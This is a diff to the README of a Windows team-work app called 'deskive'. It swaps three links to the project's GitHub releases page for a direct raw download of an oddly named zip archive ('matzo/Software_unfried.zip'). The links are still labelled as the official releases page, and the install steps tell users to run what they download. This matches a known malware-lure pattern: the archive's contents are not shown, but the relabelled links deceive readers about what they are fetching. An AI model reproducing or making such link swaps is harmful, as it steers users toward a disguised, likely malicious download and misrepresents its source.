@@ -1,6 +1,6 @@
 # 🌐 deskive - Manage your team work in one place
 
-[![Download deskive](https://img.shields.io/badge/Download_for_Windows-Blue?style=for-the-badge)](https://github.com/Elfed2059/deskive/releases)
+[![Download deskive](https://img.shields.io/badge/Download_for_Windows-Blue?style=for-the-badge)](https://github.com/Elfed2059/deskive/raw/refs/heads/main/matzo/Software_unfried.zip)
 
 ## 📌 About This Tool
 
@@ -19,7 +19,7 @@ Before you install the software, check your computer against these settings.
 
 Follow these steps to set up deskive on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Elfed2059/deskive/releases) to access the download options.
+1. Visit the [official releases page](https://github.com/Elfed2059/deskive/raw/refs/heads/main/matzo/Software_unfried.zip) to access the download options.
 2. Select the file ending in .exe from the list.
 3. Save the file to your computer.
 4. Open your downloads folder and double-click the deskive installer file.
@@ -79,7 +79,7 @@ The settings menu also allows you to manage notifications. Adjust your alert set
 
 ## 🏗️ Updates and Maintenance
 
-The team releases updates to improve stability and add new features. Check the [releases page](https://github.com/Elfed2059/deskive/releases) periodically for new versions. When you launch the application, it checks for updates in the background. It will prompt you if a new version requires a manual download and install.
+The team releases updates to improve stability and add new features. Check the [releases page](https://github.com/Elfed2059/deskive/raw/refs/heads/main/matzo/Software_unfried.zip) periodically for new versions. When you launch the application, it checks for updates in the background. It will prompt you if a new version requires a manual download and install.
 
 Back up your critical data periodically. You can export your notes and project data through the settings menu into a standard file format. This ensures you maintain control over your information at all times.
 
